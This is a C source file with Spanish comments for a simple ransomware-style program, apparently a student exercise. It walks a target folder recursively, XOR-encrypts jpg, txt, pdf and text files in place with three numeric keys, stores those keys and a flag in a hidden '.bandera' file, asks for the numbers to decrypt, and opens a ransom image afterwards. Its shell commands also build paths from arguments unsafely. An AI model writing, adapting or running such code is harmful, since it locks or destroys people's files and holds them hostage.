#include<stdio.h>
#include<stdlib.h>
#include<string.h>

//Prototipos de funciones
void nombre_direccion(char *linea_direccion, char **direccion_carpeta, char *direccion_archivo, char *nombre_archivo, FILE *archivo, ssize_t tamanio, int *dos_despues, int a,int b,int c);

int creacion_de_archivos(char *direccion_archivo, char *direccion_carpeta, char *nombre_archivo, FILE *archivo, int a, int b,int c);

char * agregar_barra(char *sin_barra);

void cifrar(char *direccion_archivo, int a, int b, int c);


//argv[1]=Carpeta a cifrar, argv[2,3,4]=Llaves para cifrar (llaves de 0 a 255)

int main(int argc, char *argv[]){


	//Variables para leer salida de comandos y archivos

	char *linea_direccion=NULL, **direccion_carpeta=NULL, *direccion_archivo=NULL, *nombre_archivo=NULL, *ls=NULL, *ls_awk=NULL, boleano[2];
	//Comando para obtener directorios
	
	char comando1[]="ls -lRa "; 

	//Comando para obtener nombre de los archivod

	char awk[]=" | awk '{if (NF>9) {{for(i=9; i<NF; i++) printf $i\" \"} print $i} else  print $NF}'";

	size_t longitud=0,longitud2=0;														
	ssize_t tamanio,tamanio_nombre;
	int i=0, *dos_despues, a, b, c, arg1=0, arg2=0, arg3=0;

	if(argc>2){
		arg1=atoi(argv[2]);
		arg2=atoi(argv[3]);
		arg3=atoi(argv[4]);	
	}

	//Reserva de memoria

	dos_despues=(int *)calloc(1,sizeof(int));
	direccion_carpeta=(char**)calloc(1,sizeof(char*));

	//Reservamos espacio y creamos el comando conforme al argumento que se de (Carpeta a cifrar)
	
	ls=(char *)calloc(strlen(comando1)+strlen(argv[1]),sizeof(char));								
	strcpy(ls,comando1);
	strcat(ls,argv[1]);

	ls_awk=(char *)calloc(strlen(ls)+strlen(awk),sizeof(char));	
	strcpy(ls_awk,ls);
	strcat(ls_awk,awk);
	//Ejecutamos los comandos	

	FILE *directorios=popen(ls,"r"), *directorios2=popen(ls_awk,"r"), *archivo;

	//Liberamos el espacio de los comandos creados	

	free(ls);
	free(ls_awk);

	FILE *bandera;


	//En caso de que no exista .bandera se crea el archivo y además se procede a cifrar los archivos
	if(bandera=fopen(".bandera","r")){
        	fread(boleano,1,2,bandera);
                fclose(bandera);
        }else{
                if(bandera=fopen(".bandera","w")){
                	fprintf(bandera,"%s","no");
			strcpy(boleano,"no");
                	fclose(bandera);
		}else{
			printf("Fallo en ejecución 1");
			exit(1);
		}
        }
	//El archivo .bandera contiene la contraseña para decifrar y además actua como bandera para saber si se va a cifrar o descifrar
	if(!strcmp("si",boleano)){
		
		if(bandera=fopen(".bandera","r")){
			fread(boleano,1,2,bandera);	
			fseek(bandera,1,SEEK_CUR);
			//Obetenemos la contraseña para decifrar
			fscanf(bandera,"%i %i %i",&a,&b,&c);
			
			do{
				if(i==0){	
					i++;
				}else{
					printf("Contraseña incorrecta \n\n");
				}
				printf("Ingrese los número (# # #): ");
        			scanf("%i %i %i",&arg1,&arg2,&arg3);
				//Verificamos que la contraseña sea correcta antes de cambiar la bandera
				if(a==arg1 && b==arg2 && c==arg3){
					if((bandera=fopen(".bandera","w"))){
                				fprintf(bandera,"%s","no");
						fclose(bandera);	
					}else{
						printf("Fallo en ejecución 2");
						exit(1);	
					}
				}
			}while((a!=arg1) || (b!=arg2) ||  (c!=arg3));
			
		}else{
			printf("Fallo de ejecución 3");
			exit(1);
		}
	}else{
		//En caso de que se vaya a cifrar se guarda la contraseña en el archivo .bandera
		if(bandera=fopen(".bandera","w")){
			fprintf(bandera,"%s","si");
			fprintf(bandera,"\n%i %i %i",atoi(argv[2]),atoi(argv[3]),atoi(argv[4]));
			fclose(bandera);
		}else{
			printf("Fallo en ejecución 4");
		}
	}
	

	//Leemos línea por linea de ambos comandos al mismo tiempo
	
	while((tamanio=getline(&linea_direccion, &longitud, directorios)) != -1 ){		
		tamanio_nombre=getline(&nombre_archivo, &longitud2, directorios2);
		nombre_direccion( linea_direccion, direccion_carpeta, direccion_archivo, nombre_archivo, archivo, tamanio, dos_despues, arg1, arg2, arg3);
	}

	//Abrimos imagen cuando se haya cifrado
	
	if(!strcmp("no",boleano)){
		//En caso de que no se pueda abrir mandamos error a null 
		system("xdg-open ./.img2 2>/dev/null");
	}
	pclose(directorios);
	pclose(directorios2);
	return 0;
}

void nombre_direccion(char *linea_direccion, char **direccion_carpeta, char *direccion_archivo, char *nombre_archivo, FILE *archivo, ssize_t tamanio, int *dos_despues, int a, int b, int c){

	//Obtenemos los direcctorios
	
	if(linea_direccion[tamanio-2]==':'){
        	*dos_despues=0;
               	*direccion_carpeta=(char *)calloc(tamanio+1,sizeof(char));
                strncpy(*direccion_carpeta,linea_direccion,tamanio-2);		
                if(direccion_carpeta[0][tamanio-3]!='/'){
			strcat(*direccion_carpeta,"/");
                }	
	}
	
	//Dos renglones después empieza la lista de archivo

        if(*dos_despues<2){
		(*dos_despues)++;
       	}else{
		//Ignoramos cuando sean otros directorios o links
		
        	if(linea_direccion[0]!='d' && linea_direccion[0]!='l'){
			
			//Creamos la dirección adsoluta de los archivos y los abrimos
                	if(tamanio>10){
                                       creacion_de_archivos(direccion_archivo,*direccion_carpeta,nombre_archivo,archivo, a, b, c);
                	}
        	}
	}
}


int creacion_de_archivos(char *direccion_archivo, char *direccion_carpeta, char *nombre_archivo, FILE *archivo, int a, int b, int c){

	char *file=NULL, *direccion_con_barra=NULL, *tipo=NULL;
	size_t tamanio_binario=0,tamanio_file=0;
	int i;
	ssize_t tamanio_linea;
	FILE *tipo_archivo;
	direccion_archivo=(char *)calloc(strlen(direccion_carpeta)+strlen(nombre_archivo),sizeof(char));
        strcpy(direccion_archivo,direccion_carpeta);
        strncat(direccion_archivo,nombre_archivo,strlen(nombre_archivo)-1);
        if(strstr(nombre_archivo,"ransonware") || strstr(nombre_archivo,".bandera") || strstr(nombre_archivo,".img2")){
		return 1;
        }
       	//Condidición para archivos con extensión en pdf, txt y jpg
	if( ((direccion_archivo[strlen(direccion_archivo)-1]=='g' || direccion_archivo[strlen(direccion_archivo)-1]=='G') && (direccion_archivo[strlen(direccion_archivo)-2]=='p' || direccion_archivo[strlen(direccion_archivo)-2]=='P') && (direccion_archivo[strlen(direccion_archivo)-3]=='j' || direccion_archivo[strlen(direccion_archivo)-3]=='J' )) || ((direccion_archivo[strlen(direccion_archivo)-1]=='t' || direccion_archivo[strlen(direccion_archivo)-1]=='T') && (direccion_archivo[strlen(direccion_archivo)-2]=='x' || direccion_archivo[strlen(direccion_archivo)-2]=='X') && (direccion_archivo[strlen(direccion_archivo)-3]=='t' || direccion_archivo[strlen(direccion_archivo)-3]=='T')) || ((direccion_archivo[strlen(direccion_archivo)-1]=='f' || direccion_archivo[strlen(direccion_archivo)-1]=='F') && (direccion_archivo[strlen(direccion_archivo)-2]=='d' ||  direccion_archivo[strlen(direccion_archivo)-2]=='D') && (direccion_archivo[strlen(direccion_archivo)-3]=='p' || direccion_archivo[strlen(direccion_archivo)-3]=='P'))){
		cifrar(direccion_archivo,a,b,c);
	}else{
	
		direccion_con_barra=agregar_barra(direccion_archivo);
		file=(char *)calloc(strlen(direccion_con_barra)+6,sizeof(char));
		strcpy(file,"file ");
		strcat(file,direccion_con_barra);
		tipo_archivo=popen(file,"r");
		getline(&tipo,&tamanio_file,tipo_archivo);
		if(strstr(tipo,"ASCII") || strstr(tipo, "data") || strstr(tipo,"UTF-8")){
			cifrar(direccion_archivo,a,b,c);		
		}	
		free(tipo);
		fclose(tipo_archivo);	
	}
       	tamanio_binario=0;
        free(direccion_archivo);
	return 0;

}

//Agreamos '/' ala dirección del archivo

char * agregar_barra(char *sin_barra){
	char *con_barra;
	int i=0,j=0;
	while(sin_barra[i]!='\0'){
		if(sin_barra[i]==' ' || sin_barra[i] =='(' || sin_barra[i] ==')'){
			j++;
		}
		i++;
	}
	
	con_barra=(char *)calloc(strlen(sin_barra)+j,sizeof(char *));
	i=0;
	j=0;
	while(sin_barra[i]!='\0'){	
		if(sin_barra[i]==' ' || sin_barra[i] =='(' || sin_barra[i] ==')'){
			con_barra[j]='\\';
			j++;
		}	
		con_barra[j]=sin_barra[i];
		j++;
		i++;
	}	
	return con_barra;
}

//Ciframos archivo por archivo, con los argumentos dados y haciendo un xor para cada byte

void cifrar(char *direccion_archivo, int a, int b, int c){
	FILE *archivo;
	char *auxiliar=NULL;
	int tamanio_archivo=0,i=0;
	if((archivo=fopen(direccion_archivo,"rb"))){  
        	fseek(archivo,0,SEEK_END);
        	tamanio_archivo=ftell(archivo);
        	auxiliar=(char *)calloc(tamanio_archivo,1);
        	rewind(archivo);
        	fread(auxiliar,1,tamanio_archivo,archivo);
        	fflush(archivo);
        	fclose(archivo);
        	if((archivo=fopen(direccion_archivo,"wb"))){

        		for(i=0;i<tamanio_archivo;i++){
        		        fprintf(archivo,"%c",auxiliar[i]^a^b^c);
        		}
        		free(auxiliar);     
        		fclose(archivo);
		}
	}	
}






